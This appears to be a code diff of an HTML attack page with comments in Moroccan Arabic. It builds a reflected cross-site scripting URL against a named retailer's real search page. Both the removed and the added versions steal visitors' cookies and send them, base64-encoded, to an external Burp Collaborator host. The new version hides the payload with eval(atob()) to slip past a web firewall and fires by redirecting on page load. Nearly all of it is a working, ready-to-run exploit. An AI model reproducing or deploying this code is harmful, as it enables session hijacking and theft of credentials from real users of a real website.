@@ -1,20 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Checking System...</title>
+    <title>Security Audit - Decathlon</title>
 </head>
 <body>
     <script>
-        // 1. هاد الكود كيسحب الكوكيز ويصيفطهم لـ Collaborator
-        var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com";
-        var payload = "new Image().src='" + collab + "/?data=' + btoa(document.cookie)";
+        // 1. هادا هو الكود (Payload) اللي جربتيه وخدم ليك فـ Console
+        // غادي نشفروه بـ Base64 باش يهرب من الـ WAF فـ الـ URL
+        var internalCode = `
+            alert("XSS Triggered on: " + document.domain);
+            var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com";
+            var data = btoa(JSON.stringify({
+                domain: document.domain,
+                cookies: document.cookie
+            }));
+            fetch(collab + "/?success=" + data, {mode: 'no-cors'});
+        `;
 
-        // 2. الرابط المعتوب اللي لقيتي + الـ Bypass
-        // استعملنا <img> حيت كتنفذ الكود فاش كيوقع error فـ الـ src
-        var xssUrl = "https://www.decathlon.com/search?q=</h1></title><img src=x onerror=\"" + payload + "\">";
+        var encoded = btoa(internalCode);
 
-        // 3. تنفيذ التحويل
-        window.location.href = xssUrl;
+        // 2. الرابط المعتوب باستعمال Tag Injection اللي نفعك
+        // استعملنا eval(atob()) باش ننفذو الكود المشفر وسط Decathlon
+        var finalUrl = "https://www.decathlon.com/search?q=</h1></title><svg/onload=eval(atob('" + encoded + "'))>";
+
+        // 3. تنفيذ الهجوم التلقائي
+        window.location.href = finalUrl;
     </script>
 </body>
 </html>
